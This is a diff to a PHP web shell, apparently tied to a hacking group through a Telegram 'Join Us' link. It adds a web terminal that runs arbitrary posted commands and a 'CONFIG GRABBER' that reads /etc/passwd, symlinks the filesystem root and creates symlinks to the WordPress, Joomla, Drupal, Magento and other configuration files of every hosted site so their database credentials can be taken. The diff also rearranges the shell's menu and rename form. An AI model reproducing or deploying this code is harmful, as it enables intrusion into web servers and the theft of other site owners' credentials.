@@ -1,6 +1,5 @@
 <?php
 date_default_timezone_set("Asia/Jakarta");
-error_reporting(0);
 session_start();
 set_time_limit(0);
 $password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
@@ -953,75 +952,6 @@ function myFunction() {
             </div>
         </div>
     </div>
-    <div class="row">
-        <div class="navbar" id="myTopnav">
-            <a href="?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>">
-                <i class="fa fa-home" aria-hidden="true"></i>
-                <span>Home</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>">
-                <i class="fa fa-file" aria-hidden="true"></i>
-                <span>Files</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&terminal">
-                <i class="fa fa-terminal" aria-hidden="true"></i>
-                <span>Terminal</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-cogs"></i>
-                <span>Config</span>
-            </a>
-            <a href="?cd=<?= x::hex(x::cwd()) ?>&adminer">
-                <i class="fa fa-user"></i>
-                <span>Adminer</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&upload">
-                <i class="fa fa-upload"></i>
-                <span>Upload</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-exclamation-triangle"></i>
-                <span>Jumping</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-exclamation-circle"></i>
-                <span>Symlink</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fas fa-network-wired"></i>
-                <span>Network</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&x=make">
-                <i class="fa fa-plus-square" aria-hidden="true"></i>
-                <span>Add Files</span>
-            </a>
-            <a href="cd=<?= $_GET['cd'] ?>">
-                <i class="fa fa-folder" aria-hidden="true"></i>
-                <span>Add Folder</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-exclamation-triangle"></i>
-                <span>Replace</span>
-            </a>
-            <a href="https://t.me/BHSec" target="_blank">
-                <i class="fa fa-users" aria-hidden="true"></i>
-                <span>Join Us</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-bug" aria-hidden="true"></i>
-                <span>CP Reset</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-info"></i>
-                <span>About me</span>
-            </a>
-            <a href="?logout" class="logout">
-                <i class="fa fa-power-off" aria-hidden="true"></i>
-                <span>Logout</span>
-            </a>
-            <a href="javascript:void(0);" style="font-size:15px;color:#000;" class="icon" onclick="myFunction()"><i class="fa fa-list-ul" aria-hidden="true"></i></a>
-        </div>
-    </div>
     <?php
     class x {
         public static $cwd;
@@ -1268,6 +1198,109 @@ function myFunction() {
                 }
             }
         }
+        public static function config($passwd) {
+        	mkdir(".config", 0777);
+        	chdir(".config");
+        	system("ln -s / root");
+        	$explode = explode("\n", $passwd);
+        	foreach ($explode as $pawd) {
+        		$pass = explode(":", $pawd);
+        		$user = $pass[5];
+        		$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
+        		if (preg_match('/vhosts/i', $user)) {
+        			system("ln -s ".$user."/httpdocs/wp-config.php ".$jembod."-Wordpress.txt");
+					system("ln -s ".$user."/httpdocs/configuration.php ".$jembod."-Joomla.txt");
+					system("ln -s ".$user."/httpdocs/config/koneksi.php ".$jembod."-Lokomedia.txt");
+					system("ln -s ".$user."/httpdocs/forum/config.php ".$jembod."-phpBB.txt");
+					system("ln -s ".$user."/httpdocs/sites/default/settings.php ".$jembod."-Drupal.txt");
+					system("ln -s ".$user."/httpdocs/config/settings.inc.php ".$jembod."-PrestaShop.txt");
+					system("ln -s ".$user."/httpdocs/app/etc/local.xml ".$jembod."-Magento.txt");
+					system("ln -s ".$user."/httpdocs/admin/config.php ".$jembod."-OpenCart.txt");
+					system("ln -s ".$user."/httpdocs/application/config/database.php ".$jembod."-Ellislab.txt");
+					system("ln -s ".$user."/httpdocs/inc/connect.php ".$jembod."-Parallels.txt");
+					system("ln -s ".$user."/httpdocs/inc/config.php ".$jembod."-MyBB.txt");
+        		}
+        	}
+
+        }
+        public static function tools($name = null) {
+        	switch ($name) {
+        		case 'terminal':
+        			?>
+        			<div class="edit">
+        				<table width="100%" class="edit">
+        					<tr>
+        						<td class="action">
+        							<span>Terminal</span>
+        						</td>
+        					</tr>
+        					<form method="post">
+        						<tr>
+        							<td>
+        								<input type="text" name="command" placeholder="command">
+        							</td>
+        						</tr>
+        						<tr>
+        							<td>
+        								<input type="submit" name="submit">
+        							</td>
+        						</tr>
+        					</form>
+        					<tr>
+        						<td>
+        							<?php
+        							if (isset($_POST['submit'])) {
+        								if ($_POST['command']) {
+        									print("<textarea readonly>".self::featureShell($_POST['command'])."</textarea>");
+        								}
+        							}
+        							?>
+        						</td>
+        					</tr>
+        				</table>
+        			</div>
+        			<?php
+        			break;
+        		case 'config':
+        			if (isset($_POST['submit'])) {
+        				if (self::config($_POST['passwd'])) {
+        					print("success");
+        				} else {
+        					?> <script>window.location='.config'</script> <?php
+        				}
+        			}
+        			?>
+        			<div class="edit">
+        				<table width="100%" class="edit">
+        					<tr>
+        						<td class="action" colspan="3">
+        							<center>
+        								<i class="fa fa-cogs"></i> CONFIG GRABBER</span>
+        							</center>
+        						</td>
+        					</tr>
+        					<form method="post">
+        						<tr>
+        							<td>
+        								<textarea name="passwd"><?= include("/etc/passwd") ?></textarea>
+        							</td>
+        						</tr>
+        						<tr>
+        							<td>
+        								<input type="submit" name="submit">
+        							</td>
+        						</tr>
+        					</form>
+        				</table>
+        			</div>
+        			<?php
+        			break;
+        		
+        		default:
+        			# code...
+        			break;
+        	}
+        } 
         public static function countDir($filename) {
             return @count(scandir($filename)) -2;
         }
@@ -1489,7 +1522,7 @@ function myFunction() {
                 <i class="fa fa-upload"></i>
                 <span>Upload</span>
             </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+            <a href="?cd=<?= $_GET['cd'] ?>&config">
                 <i class="fa fa-cogs"></i>
                 <span>Config</span>
             </a>
@@ -1624,91 +1657,8 @@ function myFunction() {
                             print("<script>alert('<h3>failed</h3>')</script>");
                         }
                     }
-                    switch ($_POST['file']) {
-                        case is_dir($_POST['file']):
-                            ?>
-                            <div class="chname">
-                                <table width="100%" class="chname">
-                                    <tr>
-                                        <td class="action" colspan="3">
-                                            <span>
-                                                <a href="?cd=<?= $_GET['cd'] ?>">
-                                                    <i class="fa fa-arrow-left" aria-hidden="true"></i>
-                                                </a>
-                                            </span>&nbsp;&nbsp;
-                                            <span>CHANGE NAME</span>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td style="width:120px;">
-                                            Filename
-                                        </td>
-                                        <td>:</td>
-                                        <td>
-                                            <?= x::w__($_POST['file'], basename($_POST['file'])) ?>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td style="width:120px;">
-                                            Type
-                                        </td>
-                                        <td>:</td>
-                                        <td>
-                                            <?= filetype($_POST['file']) ?>
-                                            <i><?= x::countDir($_POST['file']) ?> items</i>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td style="width:120px;">
-                                            Last Modif
-                                        </td>
-                                        <td>:</td>
-                                        <td>
-                                            <?= x::ftime($_POST['file']) ?>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <form method="post" action="?cd=<?= $_POST['cd'] ?>">
-                                            <td colspan="3">
-                                                <div class="button">
-                                                    <button name="open" value="<?= x::hex($_POST['file']) ?>">
-                                                        <i class="far fa-edit" title="Edit"></i>&nbsp;
-                                                        Open
-                                                    </button>
-                                                    <button disabled name="action" value="chname" title="Rename">
-                                                        <i class="fa fa-magic" aria-hidden="true"></i>&nbsp;
-                                                        Rename
-                                                    </button>
-                                                    <button name="action" value="delete" title="Delete">
-                                                        <i class="fa fa-times"></i>&nbsp;
-                                                        Delete
-                                                    </button>
-                                                </div>
-                                            </td>
-                                        <input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
-                                        </form>
-                                    </tr>
-                                    <form method="post">
-                                        <tr>
-                                            <td colspan="3">
-                                                <input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
-                                            </td>
-                                        </tr>
-                                        <tr>
-                                            <td colspan="3">
-                                                <input type="submit" name="chname" value="CHANGE">
-                                                <input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
-                                                <input type="hidden" name="action" value="chname">
-                                            </td>
-                                        </tr>
-                                    </form>
-                                </table>
-                            </div>
-                            <?php
-                            break;
-                        case is_file($_POST['file']):
-                            ?>
-                            <div class="chname">
+                    ?>
+                    <div class="chname">
                                 <table width="100%" class="chname">
                                     <tr>
                                         <td class="action" colspan="3">
@@ -1786,9 +1736,7 @@ function myFunction() {
                                 </table>
                             </div>
                             <br><br><br><br><br><br><br><br><br><br>
-                            <?php
-                            break;
-                    }
+                    <?php
                     break;
                 case 'edit':
                     if (isset($_POST['edit'])) {
@@ -2113,6 +2061,15 @@ function myFunction() {
         </div>
         <?php
         exit();
+    }
+    if (isset($_GET['terminal'])) {
+    	//print('<script>alert("<h3>Cooming Soon</h3>")</script>');
+    	x::tools('terminal', $_GET['cd']);
+    	exit();
+    }
+    if (isset($_GET['config'])) {
+    	x::tools('config', '');
+    	exit();
     }
     if (isset($_GET['upload'])) {
         ?>
